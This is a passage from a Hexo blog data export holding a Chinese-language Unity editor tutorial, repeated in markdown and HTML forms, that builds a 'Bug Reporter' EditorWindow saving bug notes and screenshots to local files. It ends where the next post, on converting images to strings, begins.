\"Message1\", \"Message2\", \"Message3\", \"Message4\" };\n\n    string bugName;\n\n    GameObject bugGameObject;\n\n    string content;\n\n    private bool groupEnabled; //区域开关\n\n    float minVal = -10.0f;\n    float minLimit = -20.0f;\n    float maxVal = 10.0f;\n    float maxLimit = 20.0f;\n    string[] options = { \"Cube\", \"Sphere\", \"Plane\" };\n    int index = 0;\n    int index1 = 0;\n\n    string path;\n\n\n\n    [MenuItem(\"Tools/Bug Reporter\")]\n    static void CreateWindow()\n    {\n        GetWindow<BugReportWindow>(\"Bug Reporter\",true);\n    }\n\n    /// <summary>\n    /// 这个地方和编辑运行时的UI代码不一样\n    /// 编辑器UI和运行时UI相比还是比较简单一些的\n    /// 这个地方采用的是GUILayout\n    /// </summary>\n    private void OnGUI()\n    {\n        GUILayout.BeginVertical();\n        GUILayout.Space(10);\n\n\n        //绘制标题\n        GUI.skin.label.fontSize = 24;\n        GUI.skin.label.alignment = TextAnchor.MiddleCenter;\n        GUILayout.Label(\"Bug Reporter\");\n\n        GUILayout.Space(10);\n\n        //绘制文本\n        bugName = EditorGUILayout.TextField(\"bug name:\", bugName);\n\n        GUILayout.Space(10);\n        GUILayout.BeginHorizontal();\n        //绘制当前正在编辑的场景\n        GUI.skin.label.fontSize = 12;\n        GUI.skin.label.alignment = TextAnchor.UpperLeft;\n        GUILayout.Label(\"当前场景:\" + EditorSceneManager.GetActiveScene().name);\n\n        //绘制当前时间\n        GUILayout.Label(\"当前时间:\" + System.DateTime.Now);\n        GUILayout.EndHorizontal();\n\n        GUILayout.Space(10);\n\n        //绘制对象,这个地方要允许可以选择当前场景的物体\n        bugGameObject = EditorGUILayout.ObjectField(\"bug game object\", bugGameObject,typeof(GameObject),true) as GameObject;\n\n        GUILayout.Space(10);\n        //绘制描述文本区域\n        GUILayout.BeginHorizontal();\n        GUILayout.Label(\"bug详情描述:\",GUILayout.MaxWidth(145));\n        content = GUILayout.TextArea(content,GUILayout.MaxHeight(60));\n        GUILayout.EndHorizontal();\n\n        GUILayout.BeginHorizontal();\n        if (GUILayout.Button(\"保存错误到本地\"))\n        {\n            SaveBug();\n        }\n\n        if (GUILayout.Button(\"保存错误以及截屏到本地\"))\n        {\n            SaveBugWithScreenshot();\n        }\n        GUILayout.EndHorizontal();\n        GUILayout.EndVertical();\n\n        groupEnabled = EditorGUILayout.BeginToggleGroup(\"Toggle Group\", groupEnabled);\n\n        if (GUILayout.Button(\"上传到服务器\"))\n        {\n            \n        }\n        EditorGUILayout.SelectableLabel(\"文本：可以选择然后复制粘贴\");\n        string psd = EditorGUILayout.PasswordField(\"Password:\", \"2222222222\");\n        GUILayout.Label(psd);\n\n        EditorGUILayout.MinMaxSlider(ref minVal, ref maxVal, minLimit, maxLimit);\n        EditorGUILayout.EndToggleGroup();\n\n        index = EditorGUILayout.Popup(index, options);\n\n        index1 = GUILayout.Toolbar(index1, options, GUILayout.Height(25));\n\n        GUILayout.Label(\"Save Path\", EditorStyles.boldLabel);\n        EditorGUILayout.BeginHorizontal();\n        EditorGUILayout.TextField(path, GUILayout.ExpandWidth(false));\n        if (GUILayout.Button(\"Browse\", GUILayout.ExpandWidth(false)))\n            path = EditorUtility.SaveFolderPanel(\"Path to Save Images\", path, Application.dataPath);   //打开保存文件夹面板\n        EditorGUILayout.EndHorizontal();\n\n        GUIStyle textStyle = new GUIStyle(\"textfield\");\n        GUIStyle buttonStyle = new GUIStyle(\"button\");\n        textStyle.active = buttonStyle.active;\n        textStyle.onNormal = buttonStyle.onNormal;\n\n        v2 = GUILayout.BeginScrollView(v2, true, true, GUILayout.Width(300), GUILayout.Height(100));\n        {\n            v = GUILayout.SelectionGrid(v, Messages, 1, textStyle);\n        }\n        GUILayout.EndScrollView();\n\n        EditorGUILayout.LabelField(\"路径\");\n        //获得一个长300的框  \n        Rect rect = EditorGUILayout.GetControlRect(GUILayout.Width(600));\n        //将上面的框作为文本输入框  \n        path = EditorGUI.TextField(rect, path);\n\n        //如果鼠标正在拖拽中或拖拽结束时，并且鼠标所在位置在文本输入框内  \n        if ((Event.current.type == EventType.DragUpdated\n          || Event.current.type == EventType.DragExited)\n          && rect.Contains(Event.current.mousePosition))\n        {\n            //改变鼠标的外表  \n            DragAndDrop.visualMode = DragAndDropVisualMode.Generic;\n            if (DragAndDrop.paths != null && DragAndDrop.paths.Length > 0)\n            {\n                path = DragAndDrop.paths[0];\n            }\n        }\n\n    }\n\n    void SaveBug()\n    {\n        Directory.CreateDirectory(\"Assets/BugReports/\");\n        StreamWriter sw = new StreamWriter(\"Assets/BugReports/\" + bugName + \".txt\");\n        sw.WriteLine(bugGameObject.name);\n        sw.WriteLine(EditorSceneManager.GetActiveScene().name);\n        sw.WriteLine(content);\n        sw.WriteLine(System.DateTime.Now);\n        sw.Close();\n        AssetDatabase.Refresh();\n    }\n\n    void SaveBugWithScreenshot()\n    {\n        Directory.CreateDirectory(\"Assets/BugReports/\");\n        StreamWriter sw = new StreamWriter(\"Assets/BugReports/\" + bugName + \".txt\");\n        sw.WriteLine(bugGameObject.name);\n        sw.WriteLine(EditorSceneManager.GetActiveScene().name);\n        sw.WriteLine(content);\n        sw.WriteLine(System.DateTime.Now);\n        sw.Close();\n        ScreenCapture.CaptureScreenshot(\"Assets/BugReports/\" + bugName + \".png\");\n        AssetDatabase.Refresh();\n    }\n\n\n    //更新\n    void Update()\n    {\n\n    }\n\n    void OnFocus()\n    {\n        Debug.Log(\"当窗口获得焦点时调用一次\");\n    }\n\n    void OnLostFocus()\n    {\n        Debug.Log(\"当窗口丢失焦点时调用一次\");\n    }\n\n    void OnHierarchyChange()\n    {\n        Debug.Log(\"当Hierarchy视图中的任何对象发生改变时调用一次\");\n    }\n\n    void OnProjectChange()\n    {\n        Debug.Log(\"当Project视图中的资源发生改变时调用一次\");\n    }\n\n    void OnInspectorUpdate()\n    {\n        //Debug.Log(\"窗口面板的更新\");\n        //这里开启窗口的重绘，不然窗口信息不会刷新\n        this.Repaint();\n    }\n\n    void OnSelectionChange()\n    {\n        //当窗口出去开启状态，并且在Hierarchy视图中选择某游戏对象时调用\n        foreach (Transform t in Selection.transforms)\n        {\n            //有可能是多选，这里开启一个循环打印选中游戏对象的名称\n            Debug.Log(\"OnSelectionChange\" + t.name);\n        }\n    }\n\n    void OnDestroy()\n    {\n        Debug.Log(\"当窗口关闭时调用\");\n    }\n\n}\n\n\n```\n","source":"_posts/Unity/UnityEditor/9 EditorWindow案例1.md","raw":"---\ntitle: 9 EditorWindow案例1\ndate: 2020-05-11 11:41:32\ntop: 9\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# 使用Editor编写一个window面板\n\n* 1:上面可以简单的制作一个window面板的编辑器,一些方法的使用需要看[EditorGUI方法介绍](https://github.com/BingJin-Zheng/Record/blob/master/Unity_Editor/4%20EditorGUI.md)\n* 2:编写一个 bug保存到本地 的window面板\n```\nusing System.Collections;\nusing System.Collections.Generic;\nusing System.IO;\nusing UnityEditor;\nusing UnityEditor.SceneManagement;\nusing UnityEngine;\n\npublic class BugReportWindow : EditorWindow\n{\n\n    Vector2 v2 = new Vector2(0, 0);\n    int v = 0;\n    string[] Messages = { \"Message1\", \"Message2\", \"Message3\", \"Message4\" };\n\n    string bugName;\n\n    GameObject bugGameObject;\n\n    string content;\n\n    private bool groupEnabled; //区域开关\n\n    float minVal = -10.0f;\n    float minLimit = -20.0f;\n    float maxVal = 10.0f;\n    float maxLimit = 20.0f;\n    string[] options = { \"Cube\", \"Sphere\", \"Plane\" };\n    int index = 0;\n    int index1 = 0;\n\n    string path;\n\n\n\n    [MenuItem(\"Tools/Bug Reporter\")]\n    static void CreateWindow()\n    {\n        GetWindow<BugReportWindow>(\"Bug Reporter\",true);\n    }\n\n    /// <summary>\n    /// 这个地方和编辑运行时的UI代码不一样\n    /// 编辑器UI和运行时UI相比还是比较简单一些的\n    /// 这个地方采用的是GUILayout\n    /// </summary>\n    private void OnGUI()\n    {\n        GUILayout.BeginVertical();\n        GUILayout.Space(10);\n\n\n        //绘制标题\n        GUI.skin.label.fontSize = 24;\n        GUI.skin.label.alignment = TextAnchor.MiddleCenter;\n        GUILayout.Label(\"Bug Reporter\");\n\n        GUILayout.Space(10);\n\n        //绘制文本\n        bugName = EditorGUILayout.TextField(\"bug name:\", bugName);\n\n        GUILayout.Space(10);\n        GUILayout.BeginHorizontal();\n        //绘制当前正在编辑的场景\n        GUI.skin.label.fontSize = 12;\n        GUI.skin.label.alignment = TextAnchor.UpperLeft;\n        GUILayout.Label(\"当前场景:\" + EditorSceneManager.GetActiveScene().name);\n\n        //绘制当前时间\n        GUILayout.Label(\"当前时间:\" + System.DateTime.Now);\n        GUILayout.EndHorizontal();\n\n        GUILayout.Space(10);\n\n        //绘制对象,这个地方要允许可以选择当前场景的物体\n        bugGameObject = EditorGUILayout.ObjectField(\"bug game object\", bugGameObject,typeof(GameObject),true) as GameObject;\n\n        GUILayout.Space(10);\n        //绘制描述文本区域\n        GUILayout.BeginHorizontal();\n        GUILayout.Label(\"bug详情描述:\",GUILayout.MaxWidth(145));\n        content = GUILayout.TextArea(content,GUILayout.MaxHeight(60));\n        GUILayout.EndHorizontal();\n\n        GUILayout.BeginHorizontal();\n        if (GUILayout.Button(\"保存错误到本地\"))\n        {\n            SaveBug();\n        }\n\n        if (GUILayout.Button(\"保存错误以及截屏到本地\"))\n        {\n            SaveBugWithScreenshot();\n        }\n        GUILayout.EndHorizontal();\n        GUILayout.EndVertical();\n\n        groupEnabled = EditorGUILayout.BeginToggleGroup(\"Toggle Group\", groupEnabled);\n\n        if (GUILayout.Button(\"上传到服务器\"))\n        {\n            \n        }\n        EditorGUILayout.SelectableLabel(\"文本：可以选择然后复制粘贴\");\n        string psd = EditorGUILayout.PasswordField(\"Password:\", \"2222222222\");\n        GUILayout.Label(psd);\n\n        EditorGUILayout.MinMaxSlider(ref minVal, ref maxVal, minLimit, maxLimit);\n        EditorGUILayout.EndToggleGroup();\n\n        index = EditorGUILayout.Popup(index, options);\n\n        index1 = GUILayout.Toolbar(index1, options, GUILayout.Height(25));\n\n        GUILayout.Label(\"Save Path\", EditorStyles.boldLabel);\n        EditorGUILayout.BeginHorizontal();\n        EditorGUILayout.TextField(path, GUILayout.ExpandWidth(false));\n        if (GUILayout.Button(\"Browse\", GUILayout.ExpandWidth(false)))\n            path = EditorUtility.SaveFolderPanel(\"Path to Save Images\", path, Application.dataPath);   //打开保存文件夹面板\n        EditorGUILayout.EndHorizontal();\n\n        GUIStyle textStyle = new GUIStyle(\"textfield\");\n        GUIStyle buttonStyle = new GUIStyle(\"button\");\n        textStyle.active = buttonStyle.active;\n        textStyle.onNormal = buttonStyle.onNormal;\n\n        v2 = GUILayout.BeginScrollView(v2, true, true, GUILayout.Width(300), GUILayout.Height(100));\n        {\n            v = GUILayout.SelectionGrid(v, Messages, 1, textStyle);\n        }\n        GUILayout.EndScrollView();\n\n        EditorGUILayout.LabelField(\"路径\");\n        //获得一个长300的框  \n        Rect rect = EditorGUILayout.GetControlRect(GUILayout.Width(600));\n        //将上面的框作为文本输入框  \n        path = EditorGUI.TextField(rect, path);\n\n        //如果鼠标正在拖拽中或拖拽结束时，并且鼠标所在位置在文本输入框内  \n        if ((Event.current.type == EventType.DragUpdated\n          || Event.current.type == EventType.DragExited)\n          && rect.Contains(Event.current.mousePosition))\n        {\n            //改变鼠标的外表  \n            DragAndDrop.visualMode = DragAndDropVisualMode.Generic;\n            if (DragAndDrop.paths != null && DragAndDrop.paths.Length > 0)\n            {\n                path = DragAndDrop.paths[0];\n            }\n        }\n\n    }\n\n    void SaveBug()\n    {\n        Directory.CreateDirectory(\"Assets/BugReports/\");\n        StreamWriter sw = new StreamWriter(\"Assets/BugReports/\" + bugName + \".txt\");\n        sw.WriteLine(bugGameObject.name);\n        sw.WriteLine(EditorSceneManager.GetActiveScene().name);\n        sw.WriteLine(content);\n        sw.WriteLine(System.DateTime.Now);\n        sw.Close();\n        AssetDatabase.Refresh();\n    }\n\n    void SaveBugWithScreenshot()\n    {\n        Directory.CreateDirectory(\"Assets/BugReports/\");\n        StreamWriter sw = new StreamWriter(\"Assets/BugReports/\" + bugName + \".txt\");\n        sw.WriteLine(bugGameObject.name);\n        sw.WriteLine(EditorSceneManager.GetActiveScene().name);\n        sw.WriteLine(content);\n        sw.WriteLine(System.DateTime.Now);\n        sw.Close();\n        ScreenCapture.CaptureScreenshot(\"Assets/BugReports/\" + bugName + \".png\");\n        AssetDatabase.Refresh();\n    }\n\n\n    //更新\n    void Update()\n    {\n\n    }\n\n    void OnFocus()\n    {\n        Debug.Log(\"当窗口获得焦点时调用一次\");\n    }\n\n    void OnLostFocus()\n    {\n        Debug.Log(\"当窗口丢失焦点时调用一次\");\n    }\n\n    void OnHierarchyChange()\n    {\n        Debug.Log(\"当Hierarchy视图中的任何对象发生改变时调用一次\");\n    }\n\n    void OnProjectChange()\n    {\n        Debug.Log(\"当Project视图中的资源发生改变时调用一次\");\n    }\n\n    void OnInspectorUpdate()\n    {\n        //Debug.Log(\"窗口面板的更新\");\n        //这里开启窗口的重绘，不然窗口信息不会刷新\n        this.Repaint();\n    }\n\n    void OnSelectionChange()\n    {\n        //当窗口出去开启状态，并且在Hierarchy视图中选择某游戏对象时调用\n        foreach (Transform t in Selection.transforms)\n        {\n            //有可能是多选，这里开启一个循环打印选中游戏对象的名称\n            Debug.Log(\"OnSelectionChange\" + t.name);\n        }\n    }\n\n    void OnDestroy()\n    {\n        Debug.Log(\"当窗口关闭时调用\");\n    }\n\n}\n\n\n```\n","slug":"Unity/UnityEditor/9 EditorWindow案例1","published":1,"updated":"2020-05-15T02:50:34.086Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d12005r2gk74r820x77","content":"<h1 id=\"使用Editor编写一个window面板\"><a href=\"#使用Editor编写一个window面板\" class=\"headerlink\" title=\"使用Editor编写一个window面板\"></a>使用Editor编写一个window面板</h1><ul>\n<li>1:上面可以简单的制作一个window面板的编辑器,一些方法的使用需要看<a href=\"https://github.com/BingJin-Zheng/Record/blob/master/Unity_Editor/4%20EditorGUI.md\" target=\"_blank\" rel=\"noopener\">EditorGUI方法介绍</a></li>\n<li>2:编写一个 bug保存到本地 的window面板<pre><code>using System.Collections;\nusing System.Collections.Generic;\nusing System.IO;\nusing UnityEditor;\nusing UnityEditor.SceneManagement;\nusing UnityEngine;\n</code></pre></li>\n</ul>\n<p>public class BugReportWindow : EditorWindow<br>{</p>\n<pre><code>Vector2 v2 = new Vector2(0, 0);\nint v = 0;\nstring[] Messages = { &quot;Message1&quot;, &quot;Message2&quot;, &quot;Message3&quot;, &quot;Message4&quot; };\n\nstring bugName;\n\nGameObject bugGameObject;\n\nstring content;\n\nprivate bool groupEnabled; //区域开关\n\nfloat minVal = -10.0f;\nfloat minLimit = -20.0f;\nfloat maxVal = 10.0f;\nfloat maxLimit = 20.0f;\nstring[] options = { &quot;Cube&quot;, &quot;Sphere&quot;, &quot;Plane&quot; };\nint index = 0;\nint index1 = 0;\n\nstring path;\n\n\n\n[MenuItem(&quot;Tools/Bug Reporter&quot;)]\nstatic void CreateWindow()\n{\n    GetWindow&lt;BugReportWindow&gt;(&quot;Bug Reporter&quot;,true);\n}\n\n/// &lt;summary&gt;\n/// 这个地方和编辑运行时的UI代码不一样\n/// 编辑器UI和运行时UI相比还是比较简单一些的\n/// 这个地方采用的是GUILayout\n/// &lt;/summary&gt;\nprivate void OnGUI()\n{\n    GUILayout.BeginVertical();\n    GUILayout.Space(10);\n\n\n    //绘制标题\n    GUI.skin.label.fontSize = 24;\n    GUI.skin.label.alignment = TextAnchor.MiddleCenter;\n    GUILayout.Label(&quot;Bug Reporter&quot;);\n\n    GUILayout.Space(10);\n\n    //绘制文本\n    bugName = EditorGUILayout.TextField(&quot;bug name:&quot;, bugName);\n\n    GUILayout.Space(10);\n    GUILayout.BeginHorizontal();\n    //绘制当前正在编辑的场景\n    GUI.skin.label.fontSize = 12;\n    GUI.skin.label.alignment = TextAnchor.UpperLeft;\n    GUILayout.Label(&quot;当前场景:&quot; + EditorSceneManager.GetActiveScene().name);\n\n    //绘制当前时间\n    GUILayout.Label(&quot;当前时间:&quot; + System.DateTime.Now);\n    GUILayout.EndHorizontal();\n\n    GUILayout.Space(10);\n\n    //绘制对象,这个地方要允许可以选择当前场景的物体\n    bugGameObject = EditorGUILayout.ObjectField(&quot;bug game object&quot;, bugGameObject,typeof(GameObject),true) as GameObject;\n\n    GUILayout.Space(10);\n    //绘制描述文本区域\n    GUILayout.BeginHorizontal();\n    GUILayout.Label(&quot;bug详情描述:&quot;,GUILayout.MaxWidth(145));\n    content = GUILayout.TextArea(content,GUILayout.MaxHeight(60));\n    GUILayout.EndHorizontal();\n\n    GUILayout.BeginHorizontal();\n    if (GUILayout.Button(&quot;保存错误到本地&quot;))\n    {\n        SaveBug();\n    }\n\n    if (GUILayout.Button(&quot;保存错误以及截屏到本地&quot;))\n    {\n        SaveBugWithScreenshot();\n    }\n    GUILayout.EndHorizontal();\n    GUILayout.EndVertical();\n\n    groupEnabled = EditorGUILayout.BeginToggleGroup(&quot;Toggle Group&quot;, groupEnabled);\n\n    if (GUILayout.Button(&quot;上传到服务器&quot;))\n    {\n\n    }\n    EditorGUILayout.SelectableLabel(&quot;文本：可以选择然后复制粘贴&quot;);\n    string psd = EditorGUILayout.PasswordField(&quot;Password:&quot;, &quot;2222222222&quot;);\n    GUILayout.Label(psd);\n\n    EditorGUILayout.MinMaxSlider(ref minVal, ref maxVal, minLimit, maxLimit);\n    EditorGUILayout.EndToggleGroup();\n\n    index = EditorGUILayout.Popup(index, options);\n\n    index1 = GUILayout.Toolbar(index1, options, GUILayout.Height(25));\n\n    GUILayout.Label(&quot;Save Path&quot;, EditorStyles.boldLabel);\n    EditorGUILayout.BeginHorizontal();\n    EditorGUILayout.TextField(path, GUILayout.ExpandWidth(false));\n    if (GUILayout.Button(&quot;Browse&quot;, GUILayout.ExpandWidth(false)))\n        path = EditorUtility.SaveFolderPanel(&quot;Path to Save Images&quot;, path, Application.dataPath);   //打开保存文件夹面板\n    EditorGUILayout.EndHorizontal();\n\n    GUIStyle textStyle = new GUIStyle(&quot;textfield&quot;);\n    GUIStyle buttonStyle = new GUIStyle(&quot;button&quot;);\n    textStyle.active = buttonStyle.active;\n    textStyle.onNormal = buttonStyle.onNormal;\n\n    v2 = GUILayout.BeginScrollView(v2, true, true, GUILayout.Width(300), GUILayout.Height(100));\n    {\n        v = GUILayout.SelectionGrid(v, Messages, 1, textStyle);\n    }\n    GUILayout.EndScrollView();\n\n    EditorGUILayout.LabelField(&quot;路径&quot;);\n    //获得一个长300的框  \n    Rect rect = EditorGUILayout.GetControlRect(GUILayout.Width(600));\n    //将上面的框作为文本输入框  \n    path = EditorGUI.TextField(rect, path);\n\n    //如果鼠标正在拖拽中或拖拽结束时，并且鼠标所在位置在文本输入框内  \n    if ((Event.current.type == EventType.DragUpdated\n      || Event.current.type == EventType.DragExited)\n      &amp;&amp; rect.Contains(Event.current.mousePosition))\n    {\n        //改变鼠标的外表  \n        DragAndDrop.visualMode = DragAndDropVisualMode.Generic;\n        if (DragAndDrop.paths != null &amp;&amp; DragAndDrop.paths.Length &gt; 0)\n        {\n            path = DragAndDrop.paths[0];\n        }\n    }\n\n}\n\nvoid SaveBug()\n{\n    Directory.CreateDirectory(&quot;Assets/BugReports/&quot;);\n    StreamWriter sw = new StreamWriter(&quot;Assets/BugReports/&quot; + bugName + &quot;.txt&quot;);\n    sw.WriteLine(bugGameObject.name);\n    sw.WriteLine(EditorSceneManager.GetActiveScene().name);\n    sw.WriteLine(content);\n    sw.WriteLine(System.DateTime.Now);\n    sw.Close();\n    AssetDatabase.Refresh();\n}\n\nvoid SaveBugWithScreenshot()\n{\n    Directory.CreateDirectory(&quot;Assets/BugReports/&quot;);\n    StreamWriter sw = new StreamWriter(&quot;Assets/BugReports/&quot; + bugName + &quot;.txt&quot;);\n    sw.WriteLine(bugGameObject.name);\n    sw.WriteLine(EditorSceneManager.GetActiveScene().name);\n    sw.WriteLine(content);\n    sw.WriteLine(System.DateTime.Now);\n    sw.Close();\n    ScreenCapture.CaptureScreenshot(&quot;Assets/BugReports/&quot; + bugName + &quot;.png&quot;);\n    AssetDatabase.Refresh();\n}\n\n\n//更新\nvoid Update()\n{\n\n}\n\nvoid OnFocus()\n{\n    Debug.Log(&quot;当窗口获得焦点时调用一次&quot;);\n}\n\nvoid OnLostFocus()\n{\n    Debug.Log(&quot;当窗口丢失焦点时调用一次&quot;);\n}\n\nvoid OnHierarchyChange()\n{\n    Debug.Log(&quot;当Hierarchy视图中的任何对象发生改变时调用一次&quot;);\n}\n\nvoid OnProjectChange()\n{\n    Debug.Log(&quot;当Project视图中的资源发生改变时调用一次&quot;);\n}\n\nvoid OnInspectorUpdate()\n{\n    //Debug.Log(&quot;窗口面板的更新&quot;);\n    //这里开启窗口的重绘，不然窗口信息不会刷新\n    this.Repaint();\n}\n\nvoid OnSelectionChange()\n{\n    //当窗口出去开启状态，并且在Hierarchy视图中选择某游戏对象时调用\n    foreach (Transform t in Selection.transforms)\n    {\n        //有可能是多选，这里开启一个循环打印选中游戏对象的名称\n        Debug.Log(&quot;OnSelectionChange&quot; + t.name);\n    }\n}\n\nvoid OnDestroy()\n{\n    Debug.Log(&quot;当窗口关闭时调用&quot;);\n}</code></pre><p>}</p>\n<pre><code></code></pre>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"使用Editor编写一个window面板\"><a href=\"#使用Editor编写一个window面板\" class=\"headerlink\" title=\"使用Editor编写一个window面板\"></a>使用Editor编写一个window面板</h1><ul>\n<li>1:上面可以简单的制作一个window面板的编辑器,一些方法的使用需要看<a href=\"https://github.com/BingJin-Zheng/Record/blob/master/Unity_Editor/4%20EditorGUI.md\" target=\"_blank\" rel=\"noopener\">EditorGUI方法介绍</a></li>\n<li>2:编写一个 bug保存到本地 的window面板<pre><code>using System.Collections;\nusing System.Collections.Generic;\nusing System.IO;\nusing UnityEditor;\nusing UnityEditor.SceneManagement;\nusing UnityEngine;\n</code></pre></li>\n</ul>\n<p>public class BugReportWindow : EditorWindow<br>{</p>\n<pre><code>Vector2 v2 = new Vector2(0, 0);\nint v = 0;\nstring[] Messages = { &quot;Message1&quot;, &quot;Message2&quot;, &quot;Message3&quot;, &quot;Message4&quot; };\n\nstring bugName;\n\nGameObject bugGameObject;\n\nstring content;\n\nprivate bool groupEnabled; //区域开关\n\nfloat minVal = -10.0f;\nfloat minLimit = -20.0f;\nfloat maxVal = 10.0f;\nfloat maxLimit = 20.0f;\nstring[] options = { &quot;Cube&quot;, &quot;Sphere&quot;, &quot;Plane&quot; };\nint index = 0;\nint index1 = 0;\n\nstring path;\n\n\n\n[MenuItem(&quot;Tools/Bug Reporter&quot;)]\nstatic void CreateWindow()\n{\n    GetWindow&lt;BugReportWindow&gt;(&quot;Bug Reporter&quot;,true);\n}\n\n/// &lt;summary&gt;\n/// 这个地方和编辑运行时的UI代码不一样\n/// 编辑器UI和运行时UI相比还是比较简单一些的\n/// 这个地方采用的是GUILayout\n/// &lt;/summary&gt;\nprivate void OnGUI()\n{\n    GUILayout.BeginVertical();\n    GUILayout.Space(10);\n\n\n    //绘制标题\n    GUI.skin.label.fontSize = 24;\n    GUI.skin.label.alignment = TextAnchor.MiddleCenter;\n    GUILayout.Label(&quot;Bug Reporter&quot;);\n\n    GUILayout.Space(10);\n\n    //绘制文本\n    bugName = EditorGUILayout.TextField(&quot;bug name:&quot;, bugName);\n\n    GUILayout.Space(10);\n    GUILayout.BeginHorizontal();\n    //绘制当前正在编辑的场景\n    GUI.skin.label.fontSize = 12;\n    GUI.skin.label.alignment = TextAnchor.UpperLeft;\n    GUILayout.Label(&quot;当前场景:&quot; + EditorSceneManager.GetActiveScene().name);\n\n    //绘制当前时间\n    GUILayout.Label(&quot;当前时间:&quot; + System.DateTime.Now);\n    GUILayout.EndHorizontal();\n\n    GUILayout.Space(10);\n\n    //绘制对象,这个地方要允许可以选择当前场景的物体\n    bugGameObject = EditorGUILayout.ObjectField(&quot;bug game object&quot;, bugGameObject,typeof(GameObject),true) as GameObject;\n\n    GUILayout.Space(10);\n    //绘制描述文本区域\n    GUILayout.BeginHorizontal();\n    GUILayout.Label(&quot;bug详情描述:&quot;,GUILayout.MaxWidth(145));\n    content = GUILayout.TextArea(content,GUILayout.MaxHeight(60));\n    GUILayout.EndHorizontal();\n\n    GUILayout.BeginHorizontal();\n    if (GUILayout.Button(&quot;保存错误到本地&quot;))\n    {\n        SaveBug();\n    }\n\n    if (GUILayout.Button(&quot;保存错误以及截屏到本地&quot;))\n    {\n        SaveBugWithScreenshot();\n    }\n    GUILayout.EndHorizontal();\n    GUILayout.EndVertical();\n\n    groupEnabled = EditorGUILayout.BeginToggleGroup(&quot;Toggle Group&quot;, groupEnabled);\n\n    if (GUILayout.Button(&quot;上传到服务器&quot;))\n    {\n\n    }\n    EditorGUILayout.SelectableLabel(&quot;文本：可以选择然后复制粘贴&quot;);\n    string psd = EditorGUILayout.PasswordField(&quot;Password:&quot;, &quot;2222222222&quot;);\n    GUILayout.Label(psd);\n\n    EditorGUILayout.MinMaxSlider(ref minVal, ref maxVal, minLimit, maxLimit);\n    EditorGUILayout.EndToggleGroup();\n\n    index = EditorGUILayout.Popup(index, options);\n\n    index1 = GUILayout.Toolbar(index1, options, GUILayout.Height(25));\n\n    GUILayout.Label(&quot;Save Path&quot;, EditorStyles.boldLabel);\n    EditorGUILayout.BeginHorizontal();\n    EditorGUILayout.TextField(path, GUILayout.ExpandWidth(false));\n    if (GUILayout.Button(&quot;Browse&quot;, GUILayout.ExpandWidth(false)))\n        path = EditorUtility.SaveFolderPanel(&quot;Path to Save Images&quot;, path, Application.dataPath);   //打开保存文件夹面板\n    EditorGUILayout.EndHorizontal();\n\n    GUIStyle textStyle = new GUIStyle(&quot;textfield&quot;);\n    GUIStyle buttonStyle = new GUIStyle(&quot;button&quot;);\n    textStyle.active = buttonStyle.active;\n    textStyle.onNormal = buttonStyle.onNormal;\n\n    v2 = GUILayout.BeginScrollView(v2, true, true, GUILayout.Width(300), GUILayout.Height(100));\n    {\n        v = GUILayout.SelectionGrid(v, Messages, 1, textStyle);\n    }\n    GUILayout.EndScrollView();\n\n    EditorGUILayout.LabelField(&quot;路径&quot;);\n    //获得一个长300的框  \n    Rect rect = EditorGUILayout.GetControlRect(GUILayout.Width(600));\n    //将上面的框作为文本输入框  \n    path = EditorGUI.TextField(rect, path);\n\n    //如果鼠标正在拖拽中或拖拽结束时，并且鼠标所在位置在文本输入框内  \n    if ((Event.current.type == EventType.DragUpdated\n      || Event.current.type == EventType.DragExited)\n      &amp;&amp; rect.Contains(Event.current.mousePosition))\n    {\n        //改变鼠标的外表  \n        DragAndDrop.visualMode = DragAndDropVisualMode.Generic;\n        if (DragAndDrop.paths != null &amp;&amp; DragAndDrop.paths.Length &gt; 0)\n        {\n            path = DragAndDrop.paths[0];\n        }\n    }\n\n}\n\nvoid SaveBug()\n{\n    Directory.CreateDirectory(&quot;Assets/BugReports/&quot;);\n    StreamWriter sw = new StreamWriter(&quot;Assets/BugReports/&quot; + bugName + &quot;.txt&quot;);\n    sw.WriteLine(bugGameObject.name);\n    sw.WriteLine(EditorSceneManager.GetActiveScene().name);\n    sw.WriteLine(content);\n    sw.WriteLine(System.DateTime.Now);\n    sw.Close();\n    AssetDatabase.Refresh();\n}\n\nvoid SaveBugWithScreenshot()\n{\n    Directory.CreateDirectory(&quot;Assets/BugReports/&quot;);\n    StreamWriter sw = new StreamWriter(&quot;Assets/BugReports/&quot; + bugName + &quot;.txt&quot;);\n    sw.WriteLine(bugGameObject.name);\n    sw.WriteLine(EditorSceneManager.GetActiveScene().name);\n    sw.WriteLine(content);\n    sw.WriteLine(System.DateTime.Now);\n    sw.Close();\n    ScreenCapture.CaptureScreenshot(&quot;Assets/BugReports/&quot; + bugName + &quot;.png&quot;);\n    AssetDatabase.Refresh();\n}\n\n\n//更新\nvoid Update()\n{\n\n}\n\nvoid OnFocus()\n{\n    Debug.Log(&quot;当窗口获得焦点时调用一次&quot;);\n}\n\nvoid OnLostFocus()\n{\n    Debug.Log(&quot;当窗口丢失焦点时调用一次&quot;);\n}\n\nvoid OnHierarchyChange()\n{\n    Debug.Log(&quot;当Hierarchy视图中的任何对象发生改变时调用一次&quot;);\n}\n\nvoid OnProjectChange()\n{\n    Debug.Log(&quot;当Project视图中的资源发生改变时调用一次&quot;);\n}\n\nvoid OnInspectorUpdate()\n{\n    //Debug.Log(&quot;窗口面板的更新&quot;);\n    //这里开启窗口的重绘，不然窗口信息不会刷新\n    this.Repaint();\n}\n\nvoid OnSelectionChange()\n{\n    //当窗口出去开启状态，并且在Hierarchy视图中选择某游戏对象时调用\n    foreach (Transform t in Selection.transforms)\n    {\n        //有可能是多选，这里开启一个循环打印选中游戏对象的名称\n        Debug.Log(&quot;OnSelectionChange&quot; + t.name);\n    }\n}\n\nvoid OnDestroy()\n{\n    Debug.Log(&quot;当窗口关闭时调用&quot;);\n}</code></pre><p>}</p>\n<pre><code></code></pre>"},{"title":"图片与字符串互转","date":"2020-05-11T03:41:32.000Z","top":100,"_content":"\n\n[MenuItem(\"test/test\")]\n\tpublic static void ShowImage()\n\t{\n\t\tstring headerPath = Application.dataPath + \"/zhuzizheng/Images/\";\n\t\tList<string> fileContentsList = new List<string>();\n\t\tvar files = Directory.GetFiles(headerPath, \"*.png\");\n\t\tforeach (var fileName in files)\n\t\t{\n\t\t\tDebug.Log(fileName);\n\t\t\tfileContentsList.Add(string.Format(\"public static Texture2D {0}Image()\", 